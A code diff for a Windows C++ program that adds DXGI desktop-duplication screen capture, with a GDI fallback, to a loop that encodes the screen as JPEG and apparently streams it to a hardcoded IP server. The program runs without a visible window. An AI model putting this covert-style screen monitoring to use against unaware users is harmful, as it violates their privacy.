@@ -38,11 +38,11 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.5.24"
+#define MANUAL_COMPILE_VERSION "1.5.25"
 // ==============================================================
 
 // 定义当前程序版本和服务器更新地址
-const std::string CURRENT_VERSION = MANUAL_COMPILE_VERSION; 
+const std::string CURRENT_VERSION = MANUAL_COMPILE_VERSION;
 const std::string UPDATE_URL_BASE = "http://120.78.3.56:5000/update/"; // 对齐5000端口
 const std::string REPORT_URL_BASE = "http://120.78.3.56:5000/report"; // 匹配服务器上的 5000 端口
 
@@ -52,6 +52,142 @@ ULONGLONG g_ServiceStartTime = 0; // 存放程序/服务刚启动时的时间
 
 // 指定为Windows子系统，运行时不显示控制台黑窗
 #pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
+
+// === 添加 DXGI 截屏支持解决视频等硬件加速黑屏问题 ===
+#include <d3d11.h>
+#include <dxgi1_2.h>
+#pragma comment(lib, "d3d11.lib")
+#pragma comment(lib, "dxgi.lib")
+
+class DxgiScreenCapturer {
+private:
+    ID3D11Device* d3dDevice = nullptr;
+    ID3D11DeviceContext* d3dContext = nullptr;
+    IDXGIOutputDuplication* deskDupl = nullptr;
+    ID3D11Texture2D* stagingTex = nullptr;
+    int texW = 0, texH = 0;
+    HBITMAP hLastBmp = NULL;
+
+public:
+    DxgiScreenCapturer() {}
+    ~DxgiScreenCapturer() { Cleanup(); }
+
+    void Cleanup() {
+        if (hLastBmp) { DeleteObject(hLastBmp); hLastBmp = NULL; }
+        if (stagingTex) { stagingTex->Release(); stagingTex = nullptr; }
+        if (deskDupl) { deskDupl->Release(); deskDupl = nullptr; }
+        if (d3dContext) { d3dContext->Release(); d3dContext = nullptr; }
+        if (d3dDevice) { d3dDevice->Release(); d3dDevice = nullptr; }
+        texW = 0; texH = 0;
+    }
+
+    bool Init() {
+        Cleanup();
+        HRESULT hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 0, nullptr, 0, D3D11_SDK_VERSION, &d3dDevice, nullptr, &d3dContext);
+        if (FAILED(hr)) return false;
+
+        IDXGIDevice* dxgiDevice = nullptr;
+        if (SUCCEEDED(d3dDevice->QueryInterface(__uuidof(IDXGIDevice), (void**)&dxgiDevice))) {
+            IDXGIAdapter* dxgiAdapter = nullptr;
+            if (SUCCEEDED(dxgiDevice->GetAdapter(&dxgiAdapter))) {
+                IDXGIOutput* dxgiOutput = nullptr;
+                if (SUCCEEDED(dxgiAdapter->EnumOutputs(0, &dxgiOutput))) {
+                    IDXGIOutput1* dxgiOutput1 = nullptr;
+                    if (SUCCEEDED(dxgiOutput->QueryInterface(__uuidof(IDXGIOutput1), (void**)&dxgiOutput1))) {
+                        dxgiOutput1->DuplicateOutput(d3dDevice, &deskDupl);
+                        dxgiOutput1->Release();
+                    }
+                    dxgiOutput->Release();
+                }
+                dxgiAdapter->Release();
+            }
+            dxgiDevice->Release();
+        }
+        return deskDupl != nullptr;
+    }
+
+    bool CaptureImage(HBITMAP& hBmpOut, int& outW, int& outH, int timeout = 0) {
+        if (!deskDupl) {
+            if (!Init()) return false;
+        }
+
+        DXGI_OUTDUPL_FRAME_INFO frameInfo;
+        IDXGIResource* desktopResource = nullptr;
+        HRESULT hr = deskDupl->AcquireNextFrame(timeout, &frameInfo, &desktopResource);
+        if (hr == DXGI_ERROR_ACCESS_LOST) {
+            Init();
+            return false;
+        }
+        if (hr == DXGI_ERROR_WAIT_TIMEOUT) {
+            if (hLastBmp) {
+                hBmpOut = (HBITMAP)CopyImage(hLastBmp, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
+                outW = texW;
+                outH = texH;
+                return hBmpOut != NULL;
+            }
+            return false;
+        }
+        if (FAILED(hr)) return false;
+
+        bool bRet = false;
+        ID3D11Texture2D* acquiredTex = nullptr;
+        if (SUCCEEDED(desktopResource->QueryInterface(__uuidof(ID3D11Texture2D), (void**)&acquiredTex))) {
+            D3D11_TEXTURE2D_DESC desc;
+            acquiredTex->GetDesc(&desc);
+
+            if (!stagingTex || texW != (int)desc.Width || texH != (int)desc.Height) {
+                if (stagingTex) { stagingTex->Release(); stagingTex = nullptr; }
+                D3D11_TEXTURE2D_DESC stagingDesc = desc;
+                stagingDesc.Usage = D3D11_USAGE_STAGING;
+                stagingDesc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
+                stagingDesc.BindFlags = 0;
+                stagingDesc.MiscFlags = 0;
+                stagingDesc.MipLevels = 1;
+                stagingDesc.ArraySize = 1;
+                d3dDevice->CreateTexture2D(&stagingDesc, nullptr, &stagingTex);
+                texW = desc.Width;
+                texH = desc.Height;
+            }
+
+            if (stagingTex) {
+                d3dContext->CopyResource(stagingTex, acquiredTex);
+                D3D11_MAPPED_SUBRESOURCE map;
+                if (SUCCEEDED(d3dContext->Map(stagingTex, 0, D3D11_MAP_READ, 0, &map))) {
+                    outW = texW;
+                    outH = texH;
+                    HDC hdc = GetDC(NULL);
+                    BITMAPINFO bmi = {0};
+                    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+                    bmi.bmiHeader.biWidth = outW;
+                    bmi.bmiHeader.biHeight = -((int)outH);
+                    bmi.bmiHeader.biPlanes = 1;
+                    bmi.bmiHeader.biBitCount = 32;
+                    bmi.bmiHeader.biCompression = BI_RGB;
+
+                    void* pBits = nullptr;
+                    HBITMAP hNewBmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
+                    if (hNewBmp) {
+                        for (UINT y = 0; y < (UINT)outH; ++y) {
+                            memcpy((BYTE*)pBits + y * outW * 4, (BYTE*)map.pData + y * map.RowPitch, outW * 4);
+                        }
+                        if (hLastBmp) DeleteObject(hLastBmp);
+                        hLastBmp = (HBITMAP)CopyImage(hNewBmp, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
+                        hBmpOut = hNewBmp;
+                        bRet = true;
+                    }
+                    ReleaseDC(NULL, hdc);
+                    d3dContext->Unmap(stagingTex, 0);
+                }
+            }
+            acquiredTex->Release();
+        }
+        desktopResource->Release();
+        deskDupl->ReleaseFrame();
+        return bRet;
+    }
+};
+
+
 
 // 判断当前是否以管理员身份运行
 bool IsRunAsAdmin() {
@@ -902,16 +1038,34 @@ void CaptureScreenJpg(const std::string& filename) {
     RECT bgRect = {0, 0, nScreenWidth, nScreenHeight};
     FillRect(hMemoryDC, &bgRect, (HBRUSH)GetStockObject(BLACK_BRUSH));
 
-    // 复制坐标应当以虚拟桌面的坐标原点开始
-    BOOL bltRes = BitBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, nScreenX, nScreenY, SRCCOPY | CAPTUREBLT);
-    if (!bltRes) {
-         ReportScreenLog("致命：BitBlt 画面复制失败，错误码：" + std::to_string(GetLastError()));
-    } else {
-         ReportScreenLog("BitBlt 抓取像素到内存完成");
+    // ==== 优先级 1：尝试使用 DXGI 捕获完美画面（无视全屏视频硬件遮挡） ====
+    bool dxgiSuccess = false;
+    DxgiScreenCapturer dxgi;
+    HBITMAP hDxgiBmp = NULL;
+    int dxW = 0, dxH = 0;
+    if (dxgi.CaptureImage(hDxgiBmp, dxW, dxH, 200) && hDxgiBmp) {
+        HDC hDxgiDC = CreateCompatibleDC(hDesktopDC);
+        SelectObject(hDxgiDC, hDxgiBmp);
+        SetStretchBltMode(hMemoryDC, COLORONCOLOR);
+        StretchBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDxgiDC, 0, 0, dxW, dxH, SRCCOPY);
+        DeleteDC(hDxgiDC);
+        DeleteObject(hDxgiBmp);
+        dxgiSuccess = true;
+        ReportScreenLog("已通过 DXGI Desktop Duplication 成功抓取！");
     }
 
-    // 【新增补丁】覆盖捕获硬件加速窗口
-    HWND hForeground = GetForegroundWindow();
+    if (!dxgiSuccess) {
+        ReportScreenLog("DXGI 抓取超时或失败，退回到传统 GDI 模式...");
+        // 复制坐标应当以虚拟桌面的坐标原点开始
+        BOOL bltRes = BitBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, nScreenX, nScreenY, SRCCOPY | CAPTUREBLT);
+        if (!bltRes) {
+             ReportScreenLog("致命：BitBlt 画面复制失败，错误码：" + std::to_string(GetLastError()));
+        } else {
+             ReportScreenLog("BitBlt 抓取像素到内存完成");
+        }
+
+        // 【新增补丁】覆盖捕获硬件加速窗口
+        HWND hForeground = GetForegroundWindow();
     if (hForeground && hForeground != GetDesktopWindow()) {
         char className[256];
         GetClassNameA(hForeground, className, sizeof(className));
@@ -933,6 +1087,7 @@ void CaptureScreenJpg(const std::string& filename) {
             }
         }
     }
+    } // 结束 if (!dxgiSuccess) 的判定分支
 
     {
         Gdiplus::Bitmap bitmap(hBitmap, NULL);
@@ -1542,6 +1697,7 @@ int main()
                             ULONG quality = 60; // 修改为60极大提升画质
 
                             // 保持阻塞模式，防止非阻塞导致大包图片发送不完整丢帧黑屏
+                            DxgiScreenCapturer dxgiStream; // 初始化DXGI对象
 
                             while (true) {
                                 int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
@@ -1575,12 +1731,28 @@ int main()
                                 RECT bgRect = {0, 0, targetW, targetH};
                                 FillRect(hMemoryDC, &bgRect, (HBRUSH)GetStockObject(BLACK_BRUSH));
 
-                                SetStretchBltMode(hMemoryDC, COLORONCOLOR); // 使用高速的缩放模式换取高帧率
-                                StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDesktopDC, nScreenX, nScreenY, nScreenWidth, nScreenHeight, SRCCOPY | CAPTUREBLT);
+                                bool dxgiSuccess = false;
+                                HBITMAP hDxgiBmp = NULL;
+                                int dxW = 0, dxH = 0;
+                                if (dxgiStream.CaptureImage(hDxgiBmp, dxW, dxH, 5)) {
+                                    if (hDxgiBmp) {
+                                        HDC hDxgiDC = CreateCompatibleDC(hDesktopDC);
+                                        SelectObject(hDxgiDC, hDxgiBmp);
+                                        SetStretchBltMode(hMemoryDC, COLORONCOLOR);
+                                        StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDxgiDC, 0, 0, dxW, dxH, SRCCOPY);
+                                        DeleteDC(hDxgiDC);
+                                        DeleteObject(hDxgiBmp);
+                                        dxgiSuccess = true;
+                                    }
+                                }
 
-                                // 【新增补丁】利用 PrintWindow(2) 强制捕获 DWM 硬件加速渲染的置前全屏应用（如浏览器全屏视频/游戏），防止纯GDI抓取变成黑屏或只有UI灰边
-                                HWND hForeground = GetForegroundWindow();
-                                if (hForeground && hForeground != GetDesktopWindow()) {
+                                if (!dxgiSuccess) {
+                                    SetStretchBltMode(hMemoryDC, COLORONCOLOR); // 使用高速的缩放模式换取高帧率
+                                    StretchBlt(hMemoryDC, 0, 0, targetW, targetH, hDesktopDC, nScreenX, nScreenY, nScreenWidth, nScreenHeight, SRCCOPY | CAPTUREBLT);
+
+                                    // 【新增补丁】利用 PrintWindow(2) 强制捕获 DWM 硬件加速渲染的置前全屏应用（如浏览器全屏视频/游戏），防止纯GDI抓取变成黑屏或只有UI灰边
+                                    HWND hForeground = GetForegroundWindow();
+                                    if (hForeground && hForeground != GetDesktopWindow()) {
                                     char className[256];
                                     GetClassNameA(hForeground, className, sizeof(className));
                                     if (strcmp(className, "Progman") != 0 && strcmp(className, "WorkerW") != 0) {
@@ -1605,6 +1777,7 @@ int main()
                                         }
                                     }
                                 }
+                                } // 结束 if (!dxgiSuccess)
 
                                 IStream* pStream = NULL;
                                 CreateStreamOnHGlobal(NULL, TRUE, &pStream);
